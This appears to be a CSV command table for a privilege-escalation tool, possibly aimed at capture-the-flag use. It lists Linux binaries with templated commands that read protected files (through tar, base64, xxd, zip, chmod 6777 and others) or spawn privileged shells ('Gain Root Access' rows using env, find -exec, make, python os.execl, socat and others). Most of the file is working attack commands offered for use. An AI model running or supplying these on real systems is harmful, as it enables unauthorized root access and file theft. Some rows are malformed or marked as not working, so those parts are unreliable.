id,name,cmd,type,notes,comments
1,cat,cat '$FILE',File Read,,Cat - concatenate files and print on the standard output
2,more,more '$FILE',File Read,,More - file perusal filter for crt viewing
3,less,less '$FILE',File Read,,Less - opposite of file perusal filter for crt viewing
4,tail,tail -n 1000 '$FILE',File Read,,Tail - output the last part  n lines of files {n = 1000}
5,head,head -n 1000 '$FILE',File Read,,Head - output the first n lines part of files {n = 1000}
6,sort,sort -m  '$FILE',File Read,,Use sort with -m merge already sorted files; do not sort
7,vim.basic,vim  '$FILE',File Read,,Use vim  to open the file in a programmer's text editor
8,vim,vim  '$FILE',File Read,,Use vim  to open the file in a programmer's text editor
9,emacs-gtk,emacs  '$FILE',File Read,,Use emacs to open the file 
10,emacs ,emacs  '$FILE',File Read,,Use emacs to open the file 
11,nano,nano '$FILE',File Read,,Use nano to open the file 
12,rev,rev '$FILE' | rev,File Read,, Use rev to reverse lines two times to read the file
13,od,od -An -c -w999 '$FILE',File Read,,Read the file with od by dumping the files in octal and other formats
14,hexdump,hd '$FILE',File Read,, Use hd to read file by dumping it into hexa
15,hd,hd '$FILE',File Read,,Use hd to read file by dumping it into hexa
16,xxd,xxd '$FILE'| xxd -r,File Read,,Read the file by makeing a hexdump then do the reverse.
17,base32,base32 '$FILE' | base32  -d,File Read,,Read the file by encoding it then decoding 
18,base64,base64 '$FILE' | base64 -d,File Read,,Read the file by encoding it then decoding
19,split,split '$FILE' pwnout;cat pwnouta*; rm pwnoutaa -f,File Read,,"Output pieces of FILE to PREFIXaa", PREFIXab", ...; default size is 1000 lines and default PREFIX is 'x'."
20,gzip,gzip -f '$FILE' -t,File Read,,Read the file after compressing it -f for Force  compression or decompression even if the file and -t  Test. Check the compressed file integrity.
21,bzip2, bzip2 -c '$FILE' | bzip2 -d,File Read,,Read the file by compressing then expanding it
22,zip,zip pwnout.zip '$FILE';unzip -p pwnout.zip;rm -f pwnout.zip,File Read,,Read the file by compressing then expanding it
23,tar,tar -c '$FILE'  | tar -xO;tar xf /flag -I '/bin/sh -c 'cat 1>&2'',File Read,,Read the file by compressing then expanding it
24,x86_64-linux-gnu-ar,ar r '$FILE.ar' '$FILE'; ar p '$FILE.ar';rm -f '$FILE.ar' ,File Read,,Read the file by compressing then expanding it
25,ar,ar r '$FILE.ar' '$FILE';ar p '$FILE.ar',File Read,,Read the file by compressing then expanding it
26,cpio,echo '$FILE' |cpio -o,File Read,,Read file by copying it from archive
27,genisoimage,genisoimage -sort '$FILE',File Read,,Read file by using the optin -sort to Sort file locations on the media
28,env,env sh -p,Gain Root Access,,Gainning an root access by  runnin a shell in a modified environment using env
29,find,find . -exec /bin/sh -p \; -quit ,Gain Root Access,,Gainning root access by using the -exec option which runs a specified command
30,make,"echo  -e ""x:\n\t/bin/sh -p"" > makefile; make;",Gain Root Access,,Gainning a root access by runnig a makefile that runs a shell
31,nice ,nice sh -p,Gain Root Access,,Gainning root access by  running a shell with modified scheduling priority using nice
32,timeout,timeout 7d /bin/sh -p,Gain Root Access,please run this commnad => timeout 7d /bin/sh -p,Gainning root access for limited duration by runnig a shell with a time limit using timeout
33,stdbuf,stdbuf -i0 /bin/sh -p,Gain Root Access,,Gain root access by  Run shell with modified buffering operations for its standard streams using stdbuf
34,setarch,setarch $(arch) /bin/sh -p,Gain Root Access,,Gainning root access by modiding the execution domains and process personality flags for the shell program 
35,watch,watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',"Gain Root Access,,Gainning root access by running a shell eriodically", showing output fullscreen the -x option Pass command to exec(2) and -p  Make  watch attempt to run command every --interval seconds"
36,socat,socat stdin exec:'sh -p',Gain Root Access,,Gainning root access by using the -exec option to run a shell
37,whiptail,whiptail --textbox --scrolltext '$FILE' 10 100,File Read,,Read a file by presnting it in message box
38,awk ,awk '//' '$FILE',File Read,,Read a file using the awk language that used in manipulation of the data 
39,mawk ,awk '//' '$FILE',File Read,,Read a file using the awk language that used in manipulation of the data 
40,sed,sed -e '' '$FILE',File Read,,Read a file by passing it sed as input stream without editing it 
41,ed,ed '$FILE',File Read, to read the file please press "p" and to quit press "q",Read a file in with ed GNU  ed  is a line-oriented text editor. It is used to create, display, modify and otherwise manipulate text files,
42,chown,chown $(id -un):$(id -gn) '$FILE';cat '$FILE',File Read,,Read the file by changing it's owner 
43,chmod,chmod 6777 '$FILE'; cat '$FILE',File Read,, Read a file by changing it's permitions
44,cp,cp '$FILE' /dev/stdout,File Read,,Read a file by copying it's content to the standard output
45,mv,mv /bin/sh /bin/mv ;mv -p,Gain Root Access,,THIS IS NOT WORKING FOR NOW 
47,perl,perl -wne print '$FILE',File Read,,Read a file using perl code 
48,python,"python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",Gain Root Access,,Gainning root access by runnig python script that runs a shell 
